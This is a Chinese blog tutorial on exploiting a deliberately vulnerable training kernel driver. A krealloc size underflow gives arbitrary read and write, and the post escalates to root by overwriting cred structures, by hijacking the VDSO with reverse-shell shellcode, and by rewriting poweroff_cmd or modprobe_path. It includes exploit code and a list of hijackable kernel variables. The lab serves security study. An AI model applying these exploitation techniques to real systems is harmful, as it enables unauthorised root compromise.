> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.jianshu.com](https://www.jianshu.com/p/fef2377f6a31)

本文从[我的先知](https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6296)转过来。  
说明：实验所需的驱动源码、bzImage、cpio 文件见[我的 github](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fbsauce%2Fkernel_exploit_series) 进行下载。本教程适合对漏洞提权有一定了解的同学阅读，具体可以看看我先知之前的文章，或者[我的简书](https://www.jianshu.com/u/a12c5b882be2)。

从任意地址读写到提权的方法，可以参考[【linux 内核漏洞利用】StringIPC—从任意读写到权限提升三种方法](https://www.jianshu.com/p/07994f8b2bb0)。

一、漏洞代码分析
========

代码见`arbitrary.h`。

### 1. 功能函数介绍

<table><thead><tr><th>功能</th><th>输入结构名</th><th>输入结构</th><th>功能</th></tr></thead><tbody><tr><td>ARBITRARY_RW_INIT</td><td>init_args</td><td>size</td><td>初始化全局对象，存于 g_mem_buffer。kmalloc(size) 空间存于 * data</td></tr><tr><td>ARBITRARY_RW_REALLOC</td><td>realloc_args</td><td>grow; size;</td><td>grow 为 1 则扩充，为 0 则缩小。<code>data_size</code>=g_mem_buffer-&gt;data_size + args-&gt;size; <code>data</code>=krealloc(g_mem_buffer-&gt;data, new_size+1, GFP_KERNEL);</td></tr><tr><td>ARBITRARY_RW_READ</td><td>read_args</td><td>*buff; count;</td><td>copy_to_user(buff, g_mem_buffer-&gt;data + <code>pos</code>, count);</td></tr><tr><td>ARBITRARY_RW_SEEK</td><td>seek_args</td><td>new_pos;</td><td><code>pos</code> = s_args-&gt;new_pos;</td></tr><tr><td>ARBITRARY_RW_WRITE</td><td>write_args</td><td>*buff; count;</td><td>copy_from_user(g_mem_buffer-&gt;data + <code>pos</code>, w_args-&gt;buff, count);</td></tr></tbody></table>

全局对象地址存于 g_mem_buffer：

```
// 全局对象
typedef struct mem_buffer {
  size_t data_size;
  char *data;
  loff_t pos;
}mem_buffer;


```

### 2. 漏洞分析

```
static int realloc_mem_buffer(realloc_args *args)
    {
        if(g_mem_buffer == NULL)
            return -EINVAL;

        size_t new_size;
        char *new_data;

        //We can overflow size here by making new_size = -1
        if(args->grow)
            new_size = g_mem_buffer->data_size + args->size;  
        else
            new_size = g_mem_buffer->data_size - args->size;

        //new_size here will equal 0 krealloc(..., 0) = ZERO_SIZE_PTR
        new_data = krealloc(g_mem_buffer->data, new_size+1, GFP_KERNEL);

        //missing check for return value ZERO_SIZE_PTR
        if(new_data == NULL)
            return -ENOMEM;

        g_mem_buffer->data = new_data;
        g_mem_buffer->data_size = new_size;

        printk(KERN_INFO "[x] g_mem_buffer->data_size = %lu [x]\n", g_mem_buffer->data_size);

        return 0;
    }


```

漏洞：`realloc_mem_buffer()`中未检查传入变量`args->size`的正负，可以传入负数。如果通过传入负数，使得`new_size== -1`，由于`kmalloc(new_size+1)`，由于`kmalloc(0)`会返回 0x10，这样`g_mem_buffer->data == 0x10; g_mem_buffer->data_size == 0xffffffffffffffff`，读写时只会检查是否满足`((count + pos) < g_mem_buffer->data_size)`条件，实现任意地址读写。

krealloc 源码如下：

```
// /include/linux/slab.h
#define ZERO_SIZE_PTR ((void *)16)
// /mm/slab_common.c
void *krealloc(const void *p, size_t new_size, gfp_t flags)
{
    void *ret;

    if (unlikely(!new_size)) {
        kfree(p);
        return ZERO_SIZE_PTR;
    }

    ret = __do_krealloc(p, new_size, flags);
    if (ret && kasan_reset_tag(p) != kasan_reset_tag(ret))
        kfree(p);

    return ret;
}
//krealloc传入0时返回0x10


```

read_mem_buffer() 函数如下，若满足条件`((count + pos) < g_mem_buffer->data_size)`，则读取内容。若`g_mem_buffer->data_size == 0xffffffffffffffff`，则无论读取偏移多大，都满足本条件。

```
static int read_mem_buffer(char __user *buff, size_t count)
    {
        if(g_mem_buffer == NULL)
            return -EINVAL;

        loff_t pos;
        int ret;

        pos = g_mem_buffer->pos;

        if((count + pos) > g_mem_buffer->data_size)
            return -EINVAL;

        ret = copy_to_user(buff, g_mem_buffer->data + pos, count);

        return ret;
    }


```

二、 漏洞利用
=======

思路：ARBITRARY_RW_REALLOC 时，传入负数 size，使得`new_size == 0xffffffffffffffff`，这样返回堆块地址为 0x10，达到任意地址读写的目的。

### 1. 方法一：修改 cred 结构提权

##### （1）cred 结构体

每个线程在内核中都对应一个线程栈、一个线程结构块 thread_info 去调度，结构体同时也包含了线程的一系列信息。

thread_info 结构体存放位于线程栈的最低地址，对应的结构体定义（\arch\x86\include\asm\thread_info.h 55）：

```
struct thread_info {
    struct task_struct  *task;      /* main task structure */                          // <--------------------重要
    __u32           flags;      /* low level flags */
    __u32           status;     /* thread synchronous flags */
    __u32           cpu;        /* current CPU */
    mm_segment_t        addr_limit;
    unsigned int        sig_on_uaccess_error:1;
    unsigned int        uaccess_err:1;  /* uaccess failed */
};


```

thread_info 中最重要的信息是 task_struct 结构体，定义在（\include\linux\sched.h 1390）。

```
//裁剪过后 
struct task_struct {
    volatile long state;    /* -1 unrunnable, 0 runnable, >0 stopped */
    void *stack;
    atomic_t usage;
    unsigned int flags; /* per process flags, defined below */
    unsigned int ptrace;
... ...

/* process credentials */
    const struct cred __rcu *ptracer_cred; /* Tracer's credentials at attach */
    const struct cred __rcu *real_cred; /* objective and real subjective task
                     * credentials (COW) */
    const struct cred __rcu *cred;  /* effective (overridable) subjective task
                     * credentials (COW) */
    char comm[TASK_COMM_LEN]; /* executable name excluding path
                     - access with [gs]et_task_comm (which lock
                       it with task_lock())
                     - initialized normally by setup_new_exec */
/* file system info */
    struct nameidata *nameidata;
#ifdef CONFIG_SYSVIPC
/* ipc stuff */
    struct sysv_sem sysvsem;
    struct sysv_shm sysvshm;
#endif
... ... 
};


```

其中，cred 结构体（\include\linux\cred.h 118）就表示该线程的权限。只要将结构体的 uid~fsgid 全部覆写为 0 即可提权该线程（root uid 为 0）。前 28 字节！！！！

```
struct cred {
    atomic_t    usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t    subscribers;    /* number of processes subscribed */
    void        *put_addr;
    unsigned    magic;
#define CRED_MAGIC  0x43736564
#define CRED_MAGIC_DEAD 0x44656144
#endif
    kuid_t      uid;        /* real UID of the task */
    kgid_t      gid;        /* real GID of the task */
    kuid_t      suid;       /* saved UID of the task */
    kgid_t      sgid;       /* saved GID of the task */
    kuid_t      euid;       /* effective UID of the task */
    kgid_t      egid;       /* effective GID of the task */
    kuid_t      fsuid;      /* UID for VFS ops */
    kgid_t      fsgid;      /* GID for VFS ops */
    unsigned    securebits; /* SUID-less security management */
    kernel_cap_t    cap_inheritable; /* caps our children can inherit */
    kernel_cap_t    cap_permitted;  /* caps we're permitted */
    kernel_cap_t    cap_effective;  /* caps we can actually use */
    kernel_cap_t    cap_bset;   /* capability bounding set */
    kernel_cap_t    cap_ambient;    /* Ambient capability set */
#ifdef CONFIG_KEYS
    unsigned char   jit_keyring;    /* default keyring to attach requested
                     * keys to */
    struct key __rcu *session_keyring; /* keyring inherited over fork */
    struct key  *process_keyring; /* keyring private to this process */
    struct key  *thread_keyring; /* keyring private to this thread */
    struct key  *request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
    void        *security;  /* subjective LSM security */
#endif
    struct user_struct *user;   /* real user ID subscription */
    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
    struct group_info *group_info;  /* supplementary groups for euid/fsgid */
    struct rcu_head rcu;        /* RCU deletion hook */
};


```

##### （2）漏洞利用

**思路**：利用任意读找到 cred 结构体，再利用任意写，将用于表示权限的数据位写 0，即可提权。

**搜索 cred 结构体**：task_struct 里有个`char comm[TASK_COMM_LEN];`结构，这个结构可通过 [prctl](https://links.jianshu.com/go?to=http%3A%2F%2Fman7.org%2Flinux%2Fman-pages%2Fman2%2Fprctl.2.html) 函数中的 PR_SET_NAME 功能，设置为一个小于 16 字节的字符串。

**感慨**：task_struct 这么大，居然能找到这个结构，还能找到 prctl 能修改该字符串，tql。

```
PR_SET_NAME (since Linux 2.6.9)
    设置调用线程的name，name由arg2指定，长度最多16字节，包含终止符。也可以使用pthread_setname_np(3)设置该name，用pthread_getname_np(3)获得name。


```

**方法**：设定该值作为标记，利用任意读找到该字符串，即可找到 task_structure，进而找到 cred 结构体，再利用任意写提权。

**确定爆破范围**：task_structure 是通过调用 kmem_cache_alloc_node() 分配的，所以 kmem_cache_alloc_node 应该存在内核的动态分配区域。(\kernel\fork.c 140)。[kernel 内存映射](https://links.jianshu.com/go?to=https%3A%2F%2Fjin-yang.github.io%2Fpost%2Fkernel-memory-virtual-physical-map.html)

```
static inline struct task_struct *alloc_task_struct_node(int node)
{
    return kmem_cache_alloc_node(task_struct_cachep, GFP_KERNEL, node);
}


```

根据内存映射图，爆破范围应该在 0xffff880000000000~0xffffc80000000000。

##### （3）整合利用步骤

完整代码见`exp_cred.c`。

```
//  爆破出 cred地址
    i_args.size=0x100;
    ioctl(fd, ARBITRARY_RW_INIT, &i_args);
    rello_args.grow=0;
    rello_args.size=0x100+1;
    ioctl(fd,ARBITRARY_RW_REALLOC,&rello_args);
    puts("[+] We can read and write any memory! [+]");
    for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)
    {
        read_mem(fd,addr,buf,0x1000);
        result=memmem(buf,0x1000,target,16);
        if (result)
        {
            printf("[+] Find try2findmesauce at : %p\n",result);
            cred=*(size_t *)(result-0x8);
            real_cred=*(size_t *)(result-0x10);
            if ((cred || 0xff00000000000000) && (real_cred == cred))
            {
                target_addr=addr+result-(long int)(buf);
                printf("[+] found task_struct 0x%x\n",target_addr);
                printf("[+] found cred 0x%lx\n",real_cred);
                break;
            }
        }
    }
    if (result==0)
    {
        puts("[-] not found, try again! \n");
        exit(-1);
    }
    // 修改cred
    memset((char *)root_cred,0,28);
    write_mem(fd,cred,root_cred,28);


```

成功提权：

![](http://upload-images.jianshu.io/upload_images/6349402-91805000d694cd0b.png) 1-exp_cred_succeed.png

### 2. 方法二：劫持 VDSO

VDSO 是内核通过映射方法与用户态共享一块物理内存，从而加快执行效率，也叫影子内存。当在内核态修改内存时，用户态所访问到的数据同样会改变，这样的数据区在用户态有两块，`vdso`和`vsyscall`。

```
gdb-peda$ cat /proc/self/maps
00400000-0040c000 r-xp 00000000 08:01 561868                             /bin/cat
0060b000-0060c000 r--p 0000b000 08:01 561868                             /bin/cat
0060c000-0060d000 rw-p 0000c000 08:01 561868                             /bin/cat
01cff000-01d20000 rw-p 00000000 00:00 0                                  [heap]
...
7fff937d7000-7fff937d9000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]


```

##### （1）VDSO 介绍

vsyscall 和 VDSO 都是为了避免传统系统调用模式 INT 0x80/SYSCALL 造成的内核空间和用户空间的上下文切换。vsyscall 只允许 4 个系统调用，且在每个进程中静态分配了相同的地址；VDSO 是动态分配的，地址随机，可提供超过 4 个系统调用，VDSO 是 glibc 库提供的功能。

VDSO—Virtual Dynamic Shared Object。本质就是映射到内存中的. so 文件，对应的程序可以当普通的. so 来使用其中的函数。VDSO 所在的页，在内核态是可读、可写的，在用户态是可读、可执行的。

VDSO 在每个程序启动的加载过程如下：

```
#0  remap_pfn_range (vma=0xffff880000bba780, addr=140731259371520, pfn=8054, size=4096, prot=...) at mm/memory.c:1737
#1  0xffffffff810041ce in map_vdso (image=0xffffffff81a012c0 <vdso_image_64>, calculate_addr=<optimized out>) at arch/x86/entry/vdso/vma.c:151
#2  0xffffffff81004267 in arch_setup_additional_pages (bprm=<optimized out>, uses_interp=<optimized out>) at arch/x86/entry/vdso/vma.c:209
#3  0xffffffff81268b74 in load_elf_binary (bprm=0xffff88000f86cf00) at fs/binfmt_elf.c:1080
#4  0xffffffff812136de in search_binary_handler (bprm=0xffff88000f86cf00) at fs/exec.c:1469


```

在 map_vdso 中首先查找到一块用户态地址，将该块地址设置为 VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC，利用 remap_pfn_range 将内核页映射过去。

dump vdso 代码：

```
//dump_vdos.c
// 获取gettimeofday 字符串的偏移，便于爆破；dump vdso还是需要在程序中爆破VDSO地址，然后gdb中断下，$dump memory即可（VDSO地址是从ffffffff开头的）。
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/auxv.h> 

 #include <sys/mman.h>
int main(){
    int test;
    size_t result=0;
    unsigned long sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR);
    result=memmem(sysinfo_ehdr,0x1000,"gettimeofday",12);
    printf("[+]VDSO : %p\n",sysinfo_ehdr);
    printf("[+]The offset of gettimeofday is : %x\n",result-sysinfo_ehdr);
    scanf("Wait! %d", test);  
    /* 
    gdb break point at 0x400A36
    and then dump memory
    why only dump 0x1000 ???
    */
    if (sysinfo_ehdr!=0){
        for (int i=0;i<0x2000;i+=1){
            printf("%02x ",*(unsigned char *)(sysinfo_ehdr+i));
        }
    }
}


```

##### （2）利用思路

1.  获取 vdso 的映射地址（爆破），vdso 的范围在 0xffffffff80000000~0xffffffffffffefff。
    
2.  通过劫持 task_prctl，将其修改成为 set_memory_rw
    
3.  然后传入 VDSO 的地址，将 VDSO 修改成为可写的属性。
    
4.  用 shellcode 覆盖部分 vDSO（shellcode 只为 root 进程创建反弹 shell，可以通过调用 0x66—sys_getuid 系统调用并将其与 0 进行比较；如果没有 root 权限，我们继续调用 0x60—sys_gettimeofday 系统调用。同样在 root 进程当中，我们不想造成更多的问题，我们将通过 0x39 系统调用 fork 一个子进程，父进程继续执行 sys_gettimeofday，而由子进程来执行反弹 shell。）
    
5.  调用 gettimeofday 函数或通过 prtcl 的系统调用，让内核调用 shellcode 提权。  
    所用 shellcode 可见 [https://gist.github.com/itsZN/1ab36391d1849f15b785](https://links.jianshu.com/go?to=https%3A%2F%2Fgist.github.com%2FitsZN%2F1ab36391d1849f15b785)（它将连接到 127.0.0.1:3333 并执行”/bin/sh”），用 "nc -l -p 3333 -v" 链接即可；shellcode 写到 gettimeofday 附近，通过 dump vDSO 确定，本题是 0xca0。
    

##### （3）整合利用步骤

由于进程不会主动调用 gettimeofday 来触发 shellcode，所以我们自己写一个循环程序，不断调用 gettimeofday。

```
//sudo_me.c           一定要动态编译，不然不会调用gettimeofday函数,还要在_install根目录下创建lib64文件，文件里放需要用到的库（ld-linux-x86-64.so.2 和 libc.so.6）。
#include <stdio.h>

int main(){
    while(1){
        puts("111");
        sleep(1);
        gettimeofday();
    }
}


```

完整 exp 见`exp_VDSO.c`。

![](http://upload-images.jianshu.io/upload_images/6349402-c01943698e03304b.png) 2-exp_VDSO_succeed.png

### 3. 方法三：利用`call_usermodehelper()`

##### （1）call_usermodehelper() 原理

最初原理可见 [New Reliable Android Kernel Root Exploitation Techniques](https://links.jianshu.com/go?to=http%3A%2F%2Fpowerofcommunity.net%2Fpoc2016%2Fx82.pdf)。

prctl 的原理已在[绕过内核 SMEP 姿势总结与实践](https://www.jianshu.com/p/3d707fac499a)中分析过，就不再赘述。

由于 prctl 第一个参数是 int 类型，在 64 位系统中被截断，所以不能正确传参。

`call_usermodehelper`（\kernel\kmod.c 603），这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有 root 权限，因此只要将参数传递正确就可以执行任意命令（注意命令中的参数要用全路径，不能用相对路径）。但其中提到在安卓利用时需要关闭 SEAndroid。

我们要劫持`task_prctl`到`call_usermoderhelper`吗，不是的，因为这里的第一个参数也是`64位`的，也不能直接劫持过来。但是内核中有些代码片段是调用了`Call_usermoderhelper`的，可以转化为我们所用（通过它们来执行用户代码或访问用户数据，绕过 SMEP）。

也就是有些函数从内核调用了用户空间，例如`kernel/reboot.c`中的`__orderly_poweroff`函数中调用了`run_cmd`参数是`poweroff_cmd`, 而且`poweroff_cmd`是一个全局变量，可以修改后指向我们的命令。

```
static int __orderly_poweroff(bool force)
{
    int ret;

    ret = run_cmd(poweroff_cmd);

    if (ret && force) {
        pr_warn("Failed to start orderly shutdown: forcing the issue\n");

        /*
         * I guess this should try to kick off some daemon to sync and
         * poweroff asap.  Or not even bother syncing if we're doing an
         * emergency shutdown?
         */
        emergency_sync();
        kernel_power_off();
    }

    return ret;
}

static void poweroff_work_func(struct work_struct *work)
{
    __orderly_poweroff(poweroff_force);
}


```

##### （2）利用步骤

完整利用代码见`exp_run_cmd.c`。

1.  利用 kremalloc 的问题，达到任意地址读写的能力
2.  通过快速爆破，泄露出 VDSO 地址。
3.  利用 VDSO 和 kernel_base 相差不远的特性，泄露出内核基址。（泄露 VDSO 是为了泄露内核基址？）
4.  篡改 prctl 的 hook 为 selinux_disable 函数的地址
5.  调用 prctl 使得 selinux 失效（INetCop Security 给出的思路中要求的一步）
6.  篡改 poweroff_cmd 使其等于我们预期执行的命令（"/bin/chmod 777 /flag\0"）。或者将 poweroff_cmd 处改为一个反弹 shell 的 binary 命令，监听端口就可以拿到 shell。
7.  篡改 prctl 的 hook 为 orderly_poweroff
8.  调用 prctl 执行我们预期的命令，达到内核提权的效果。

其中第 4、5 步是安卓 root 必须的两步，本题 linux 环境下不需要。

利用成功截图如下：

![](http://upload-images.jianshu.io/upload_images/6349402-dfffd6445171df58.png) 3-exp_run_cmd_succeed.png

##### （3）总结可劫持的变量

不需要劫持函数虚表，不需要传参数那么麻烦，只需要修改变量即可提权。

1.  modprobe_path

```
// /kernel/kmod.c
char modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe";
// /kernel/kmod.c
static int call_modprobe(char *module_name, int wait) 
    argv[0] = modprobe_path;
    info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
                     NULL, free_modprobe_argv, NULL);
    return call_usermodehelper_exec(info, wait | UMH_KILLABLE);
// /kernel/kmod.c
int __request_module(bool wait, const char *fmt, ...)
    ret = call_modprobe(module_name, wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC);


```

__request_module - try to load a kernel module

触发：可通过执行错误格式的 elf 文件来触发执行 modprobe_path 指定的文件。

2.  poweroff_cmd

```
// /kernel/reboot.c
char poweroff_cmd[POWEROFF_CMD_PATH_LEN] = "/sbin/poweroff";
// /kernel/reboot.c
static int run_cmd(const char *cmd)
    argv = argv_split(GFP_KERNEL, cmd, NULL);
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
// /kernel/reboot.c
static int __orderly_poweroff(bool force)    
    ret = run_cmd(poweroff_cmd);


```

触发：执行__orderly_poweroff() 即可。

3.  uevent_helper

```
// /lib/kobject_uevent.c
#ifdef CONFIG_UEVENT_HELPER
char uevent_helper[UEVENT_HELPER_PATH_LEN] = CONFIG_UEVENT_HELPER_PATH;
// /lib/kobject_uevent.c
static int init_uevent_argv(struct kobj_uevent_env *env, const char *subsystem)
{  ......
    env->argv[0] = uevent_helper; 
  ...... }
// /lib/kobject_uevent.c
int kobject_uevent_env(struct kobject *kobj, enum kobject_action action,
               char *envp_ext[])
{......
    retval = init_uevent_argv(env, subsystem);
    info = call_usermodehelper_setup(env->argv[0], env->argv,
                         env->envp, GFP_KERNEL,
                         NULL, cleanup_uevent_env, env);
......}


```

4.  ocfs2_hb_ctl_path

```
// /fs/ocfs2/stackglue.c
static char ocfs2_hb_ctl_path[OCFS2_MAX_HB_CTL_PATH] = "/sbin/ocfs2_hb_ctl";
// /fs/ocfs2/stackglue.c
static void ocfs2_leave_group(const char *group)
    argv[0] = ocfs2_hb_ctl_path;
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);


```

5.  nfs_cache_getent_prog

```
// /fs/nfs/cache_lib.c
static char nfs_cache_getent_prog[NFS_CACHE_UPCALL_PATHLEN] =
                "/sbin/nfs_cache_getent";
// /fs/nfs/cache_lib.c
int nfs_cache_upcall(struct cache_detail *cd, char *entry_name)
    char *argv[] = {
        nfs_cache_getent_prog,
        cd->name,
        entry_name,
        NULL
    };
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);


```

6.  cltrack_prog

```
// /fs/nfsd/nfs4recover.c
static char cltrack_prog[PATH_MAX] = "/sbin/nfsdcltrack";
// /fs/nfsd/nfs4recover.c
static int nfsd4_umh_cltrack_upcall(char *cmd, char *arg, char *env0, char *env1)
    argv[0] = (char *)cltrack_prog;
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);


```

### 4. 方法四： 劫持 tty_struct

找不到`mov rsp,rax`、`mov rsp,[rbx+xx]`这样的 gadget，有点尴尬。

具体方法还是参考 [call_usermodehelper 提权路径变量总结](https://www.jianshu.com/p/a2259cd3e79e)，其中总结了如何劫持 tty_struct 中的 write 和 ioctl 两种方法。

### 参考：

[https://www.jianshu.com/p/07994f8b2bb0](https://www.jianshu.com/p/07994f8b2bb0)

[https://invictus-security.blog/2017/06/](https://links.jianshu.com/go?to=https%3A%2F%2Finvictus-security.blog%2F2017%2F06%2F)

[https://github.com/invictus-0x90/vulnerable_linux_driver](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Finvictus-0x90%2Fvulnerable_linux_driver)

[https://www.jianshu.com/p/a2259cd3e79e](https://www.jianshu.com/p/a2259cd3e79e)